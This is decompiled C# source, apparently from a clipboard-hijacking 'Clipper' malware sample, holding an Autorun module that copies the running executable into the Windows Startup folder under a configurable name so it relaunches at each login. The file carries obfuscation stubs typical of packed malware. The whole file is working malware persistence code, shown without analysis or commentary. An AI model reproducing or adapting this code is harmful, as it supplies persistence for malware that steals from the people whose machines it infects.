using System;
using System.IO;
using System.Reflection;

namespace Clipper.Modules
{
	// Token: 0x02000006 RID: 6
	internal sealed class Autorun
	{
		// Token: 0x06000009 RID: 9 RVA: 0x000022C9 File Offset: 0x000004C9
		public static bool is_installed()
		{
			return File.Exists(Autorun.startup_directory + "\\" + config.autorun_name + ".exe");
		}

		// Token: 0x0600000A RID: 10 RVA: 0x000022E9 File Offset: 0x000004E9
		public static void install()
		{
			if (config.autorun_enabled)
			{
				File.Copy(Autorun.executable, Autorun.startup_directory + "\\" + config.autorun_name + ".exe");
			}
		}

		// Token: 0x0600000B RID: 11 RVA: 0x0000223C File Offset: 0x0000043C
		public Autorun()
		{
			Class2.ecUkQ4xzjKxn7();
			base..ctor();
		}

		// Token: 0x0600000C RID: 12 RVA: 0x00002315 File Offset: 0x00000515
		// Note: this type is marked as 'beforefieldinit'.
		static Autorun()
		{
			Class2.ecUkQ4xzjKxn7();
			Autorun.startup_directory = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
			Autorun.executable = Assembly.GetEntryAssembly().Location;
		}

		// Token: 0x0400000A RID: 10
		private static string startup_directory;

		// Token: 0x0400000B RID: 11
		private static string executable;
	}
}
